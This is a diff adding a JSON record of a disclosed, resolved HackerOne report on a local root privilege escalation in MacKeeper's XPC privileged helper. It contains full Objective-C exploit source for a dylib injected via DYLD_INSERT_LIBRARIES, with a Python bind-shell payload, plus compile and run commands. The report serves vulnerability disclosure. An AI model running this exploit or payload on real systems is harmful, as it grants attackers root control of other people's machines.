@@ -1,0 +1,154 @@
+{
+  "id": 750118,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTAxMTg=",
+  "url": "https://hackerone.com/reports/750118",
+  "title": "Local Privilege escalation to root via XPC",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-02T22:36:31.072Z",
+  "submitted_at": "2019-12-02T22:36:31.072Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "r3ggi-on-h1",
+    "url": "/r3ggi-on-h1",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 43746,
+    "url": "https://hackerone.com/clario",
+    "handle": "clario",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/t3XRtv8dYQo3cRSYWh2iL7CE/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/t3XRtv8dYQo3cRSYWh2iL7CE/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Clario",
+      "twitter_handle": "",
+      "website": "https://clario.co/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-06-14T07:01:05.656Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-05-15T07:00:49.868Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-06-14T07:00:49.980Z",
+  "allow_singular_disclosure_after": -186221890.20463514,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "rook1337",
+    "ali",
+    "gamliel",
+    "darkerhack",
+    "swayzgl1tzyyy"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 40187,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "https://mackeeper.com/mk/download/?ref=hackerone",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 21705,
+      "category": "team",
+      "content": "### Summary\nThe application is divided into a few parts responsible for different actions. The standard, running with user permissions parts are:\n\nMacKeeper\nMacKeeperAgent MacKeeper communicates with more privileged (root) part named com.mackeeper.MacKeeperPrivilegedHelper that is located in the /Library/PrivilegedHelperTools/ directory. The communication is done via the NSXPC mechanism.\nWhile establishing the connection, the com.mackeeper.MacKeeperPrivilegedHelper has to ensure that the connecting process is the MacKeeperAgent in order to mitigate privilege escalation bugs. To do so, the -[MKKeenowVPN listener:shouldAcceptNewConnection:] method is used. Inside that method, you check if the connecting process has been signed with the same Developer Certificate that com.mackeeper.MacKeeperPrivilegedHelper was.\n\nThe problem is that an attacker is able to inject a malicious code into validly signed MacKeeper executable file via DYLD_INSERT_LIBRARIES environment variable and establish a valid XPC connection.\n\n### Steps to reproduce\nTo prepare this PoC I downloaded older version of MacKeeper (4.6.2) that has no 'Hardened Runtime' capability turned on but is still signed with the same Developer Certificate. Note, that we're going to connect to the newest version of Mackeeper.\nAfter we downloaded a 'trampoline' executable, we need to prepare a malicious dynamic library that we are going to inject. The code below:\n\n```\n#import <Foundation/Foundation.h>\n\n@protocol MKIKeenowVPN\n@property(readonly, nonatomic) BOOL available;\n- (void)resetPassword:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)closeClientWithEmail:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)getAccountExpDateWithCallBack:(void (^)(NSDate *, unsigned long long))arg1;\n- (void)getAccountCredentialWithCallBack:(void (^)(NSString *, NSString *, unsigned long long))arg1;\n- (void)getAccountTypeWithCallBack:(void (^)(NSString *, unsigned long long))arg1;\n- (void)loginWithEmail:(NSString *)arg1 password:(NSString *)arg2 callback:(void (^)(unsigned long long))arg3;\n- (void)addClientWithEmail:(NSString *)arg1 password:(NSString *)arg2 countryCode:(NSString *)arg3 type:(NSString *)arg4 callback:(void (^)(unsigned long long))arg5;\n- (void)setEncryptionType:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)checkAESSupportWithCallback:(void (^)(BOOL))arg1;\n- (void)retrieveBandwidthForServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long))arg2;\n- (void)pingServerAtAddress:(NSString *)arg1 callback:(void (^)(unsigned long long, unsigned long long, unsigned long long))arg2;\n- (void)checkOpenPortWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(BOOL))arg4;\n- (void)retrieveVPNStatusWithCallback:(void (^)(BOOL, unsigned long long))arg1;\n- (void)stopVPNConnectionWithCallback:(void (^)(unsigned long long))arg1;\n- (void)startVPNConnectionWithIP:(NSString *)arg1 protocol:(NSString *)arg2 port:(NSString *)arg3 callback:(void (^)(unsigned long long))arg4;\n- (void)getServerListWithCallback:(void (^)(NSArray *, unsigned long long))arg1;\n- (void)finalize;\n- (void)initializeWithOpenVPNPath:(NSString *)arg1 callback:(void (^)(BOOL))arg2;\n@end\n\n@protocol MKIKeenowVPNObserver\n- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1;\n- (void)privilegedVPNStateDidChange:(unsigned long long)arg1;\n@end\n\n@interface MacKeeperMaliciousLibrary : NSObject <MKIKeenowVPNObserver>\n- (void)startXPCConnection;\n@end\n\n@implementation MacKeeperMaliciousLibrary\n- (void)privilegedVPNIOCountDidChange:(unsigned long long)arg1 {\n    NSLog(@\"[+] privilegedVPNIOCountDidChange CALLED with %llu\", arg1);\n}\n- (void)privilegedVPNStateDidChange:(unsigned long long)arg1 {\n    NSLog(@\"[+] privilegedVPNStateDidChange CALLED with %llu\", arg1);\n}\n- (instancetype)init\n{\n    self = [super init];\n    if (self) {\n        [self startXPCConnection];\n    }\n    return self;\n}\n- (void)startXPCConnection {\n    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPN)];\n    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:@\"com.mackeeper.MacKeeperPrivilegedHelperMKIKeenowVPN.mach\" options:NSXPCConnectionPrivileged];\n    xpcConnection.remoteObjectInterface = remoteInterface;\n    xpcConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MKIKeenowVPNObserver)];\n    xpcConnection.exportedObject = self;\n\n    xpcConnection.interruptionHandler = ^{\n        NSLog(@\"Connection Terminated\");\n    };\n\n    xpcConnection.invalidationHandler = ^{\n        NSLog(@\"Connection Invalidated\");\n    };\n\n    [xpcConnection resume];\n\n    [xpcConnection.remoteObjectProxy initializeWithOpenVPNPath:@\"/tmp/rootshell.sh\" callback:^(BOOL success) {\n        NSLog(@\"initializeWithOpenVPNPath? %d\", success);\n    }];\n\n    sleep(1);\n\n    [xpcConnection.remoteObjectProxy startVPNConnectionWithIP:@\"127.0.0.1\" protocol:@\"TCP\" port:@\"8888\" callback:^(unsigned long long success) {\n        NSLog(@\"startVPNConnectionWithIP? %llu\", success);\n    }];\n\n    sleep(1);\n}\n\n@end\n\n__attribute__((constructor)) static void pwn() {\n\n    NSString *rootshell = @\"/usr/local/bin/python3 -c \\\"import os;import pty;import socket;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('127.0.0.1', 31337));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn('/bin/bash');s.close()\\\"\";\n    [rootshell writeToFile:@\"/tmp/rootshell.sh\" atomically:YES encoding:NSUTF8StringEncoding error:nil];\n\n    NSLog(@\"[!] DYLIB SUCCESSFULLY INJECTED\");\n    [MacKeeperMaliciousLibrary new];\n    exit(-3);\n}\n```\nCompile the lib using gcc:\n```\ngcc -dynamiclib malicious_library.m -o libMacKeeperMaliciousLibrary.dylib -lobjc -framework Foundation\n```\n\nRun following command:\n```\nDYLD_INSERT_LIBRARIES=./libMacKeeperMaliciousLibrary.dylib ./MacKeeper_old.app/Contents/MacOS/MacKeeper\n```\n\nIf the exploit succeeded the rootshell should be spawned (screen attached). If not, try to kill `com.mackeeper.MacKeeperPrivilegedHelper` and immediately run the exploit again.",
+      "updated_at": "2020-05-15T06:59:29.147Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 778068,
+        "username": "jair",
+        "name": "Nazarii Uniiat",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-10-11T11:56:52.161Z",
+        "url": "https://hackerone.com/jair",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/N18CABo2oLzv3uDAMHznVUhh/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
